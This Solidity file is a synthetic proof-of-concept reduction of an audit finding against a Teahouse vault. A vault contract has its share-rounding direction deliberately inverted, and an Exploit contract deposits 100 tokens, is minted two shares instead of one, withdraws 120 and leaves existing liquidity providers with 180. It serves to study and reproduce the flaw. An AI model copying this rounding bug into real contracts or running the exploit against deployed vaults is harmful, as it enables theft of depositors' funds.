// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Teahouse — TeaVaultAmbient._fractionOfShares rounds the wrong way
    (Zokyo, finding #45705)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: `_isRoundingUp == false` calls mulDivRoundingUp, and the
    true branch calls floor division. A deposit that asks to round the
    minted shares down (3 * 100e18 / 200e18 = 1.5) mints 2 shares instead
    of 1. Redeeming those 2 shares returns 120 assets. The attacker
    deposited 100. The existing LPs' 200 is now 180. */

contract ERC20 {
    string public symbol = "ASSET";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Vault {
    ERC20 public token;
    bool public fixedMode;
    uint256 public totalAssets;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    uint256 public lastMinted;

    constructor(ERC20 t, bool fixed_) {
        token = t;
        fixedMode = fixed_;
    }

    function seed(address who, uint256 shares, uint256 assets) external {
        totalShares = shares;
        totalAssets = assets;
        sharesOf[who] = shares;
    }

    function _fractionOfShares(uint256 _assetAmount, uint256 _shares, uint256 _totalShares, bool _isRoundingUp)
        internal
        view
        returns (uint256 amount)
    {
        if (fixedMode) {
            amount = _isRoundingUp
                ? _mulDivRoundingUp(_assetAmount, _shares, _totalShares)
                : _mulDiv(_assetAmount, _shares, _totalShares);
        } else if (_isRoundingUp) {
            amount = _mulDiv(_assetAmount, _shares, _totalShares);
        } else {
            amount = _mulDivRoundingUp(_assetAmount, _shares, _totalShares); // @> VULN: round-down request uses mulDivRoundingUp
        }
    }

    function _mulDiv(uint256 a, uint256 b, uint256 d) internal pure returns (uint256) {
        return a * b / d;
    }

    function _mulDivRoundingUp(uint256 a, uint256 b, uint256 d) internal pure returns (uint256) {
        uint256 floor = a * b / d;
        if (mulmod(a, b, d) > 0) floor += 1;
        return floor;
    }

    function deposit(uint256 assets) external returns (uint256 minted) {
        token.transferFrom(msg.sender, address(this), assets);
        minted = _fractionOfShares(totalShares, assets, totalAssets, false);
        lastMinted = minted;
        totalAssets += assets;
        totalShares += minted;
        sharesOf[msg.sender] += minted;
    }

    function withdraw(uint256 sh) external returns (uint256 assets) {
        sharesOf[msg.sender] -= sh;
        assets = _fractionOfShares(totalAssets, sh, totalShares, false);
        totalShares -= sh;
        totalAssets -= assets;
        token.transfer(msg.sender, assets);
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Vault public vault; // nonce 2
    address public constant VICTIM = address(uint160(0xBEEF));

    constructor() {
        token = new ERC20();
        vault = new Vault(token, false);
        token.mint(address(vault), 200 ether);
        vault.seed(VICTIM, 3, 200 ether);
        token.mint(address(this), 100 ether);
    }

    function run() external {
        token.approve(address(vault), 100 ether);
        uint256 minted = vault.deposit(100 ether);
        require(minted == 2, "rounded up to 2 shares");
        uint256 out = vault.withdraw(minted);
        require(out == 120 ether, "withdrew 120");
        require(token.balanceOf(address(this)) == 120 ether, "profit 20");
        require(token.balanceOf(address(vault)) == 180 ether, "lps left with 180");
        require(vault.sharesOf(VICTIM) == 3, "victim shares unchanged");
    }
}
